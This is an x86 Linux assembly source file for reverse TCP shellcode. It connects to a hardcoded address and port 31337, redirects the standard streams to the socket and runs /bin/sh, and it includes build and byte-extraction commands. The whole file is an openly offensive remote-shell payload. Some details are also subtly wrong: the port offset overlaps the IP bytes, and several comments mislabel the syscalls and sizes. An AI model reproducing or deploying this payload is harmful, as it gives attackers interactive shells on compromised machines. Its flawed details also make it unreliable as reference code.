; Filename: reversetcpshell.nasm
; Purpose: creating a reverse tcp shellcode

;to compile the code
;nasm -f elf reversetcpshell.nasm
;ld -melf_i386 reversetcpshell.o -o reversetcpshell
;for i in `objdump -D ./reversetcpshell | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done  


section .text

global _start

_start:

    jmp short p_num		; p_num = port number

shellcode:
    pop ebp			; pop the port value's address
	
;--------------------------------------------------------------------
;sockfd = socket(int socket_family, int socket_type, int protocol);
;socket(2,1,0)

    xor eax, eax		; prepare eax to hold syscall number
  
    xor ebx, ebx
    inc ebx			; ebx: call = 1 (sys_socket)

    xor esi,esi			; clear out the esi register 

    push eax			; protocol IPPROTO_IP=0
    push ebx			; socket_type SOCK_STREAM = 1 
    push byte 0x2		; socket_family AF_INET =2

    mov ecx,esp			; esp has the value of the byte 0x2 top of stack
	
    mov al, 102			; al 102=SYS_SOCKET ,using al instead of eax avoids nulls(0x00)
    int 0x80			; syscall

    mov edi, eax		; save the socketfd into edi to prevent
				; overwrite the socketfd after other calls
	
;--------------------------------------------------------------------
;int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
;connect(sockfd, &sockaddr, 16)

    mov al, 102             ; al holds 102(socket syscall) using al instead of eax avoids nulls(0x00)
    mov bl, 3               ; set for socketcall call tyep =2 connect()

; (const struct sockaddr) needs three arguments

    push dword [ebp]      ; ip
    push word [ebp+2]         ; port
    push word 0x2           ; sin_family=AF_INET 2
    mov ecx, esp            ; write struct to ecx

;int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

    push byte 16		; addrlen = 16 bits = 4 bytes (0.0.0.0)
    push ecx			; ecx points to struct sockaddr *addr
    push edi			; fd

    mov ecx, esp            

    int 0x80
;--------------------------------------------------------------------
;int dup2(int oldfd, int newfd);
;dup2(sockfd, 0)

; use loop to create three filedescriptors STDIN=0,STDOUT=1,STDERR=2

	mov ebx, edi		; save the socketfd into ebx  
	xor ecx, ecx		; Zero out ecx  
	mov cl, 2		; initilize counter ecx to 2 

loop:  
    mov al, 0x3f		; Set eax to 63 (syscall number for dup2)
    int 0x80			; Make the syscall
    dec ecx			; Decrement ecx (newfd)
    jns loop			; Loop until ecx is less than 0
	
;-------------------------------------------------------------------
;int execve(const char *filename, char *const argv[],char *const envp[]);
;execve("/bin/sh", 0, 0)

	xor eax, eax		; Zero out eax  
	push eax		; Push 0 onto stack (null terminator)  
	push dword 0x68732f2f	; push "//sh"  
	push dword 0x6e69622f	; push "/bin"  
	mov ebx, esp		; set ebx to point to filename /bin/sh
	mov ecx, eax		; Set ecx to 0  
	mov edx, eax		; Set edx to 0
	
	mov al, 0xb		; al holds 11(execve) using al instead of eax avoids nulls(0x00) 
	int 0x80 		; syscall
	
p_num:
	call shellcode
	ip:   db 127,0,0,1      ; ip to use in connect 192.168.112.142
	port: db 0x7a, 0x69     ; port number to use in connect 31337
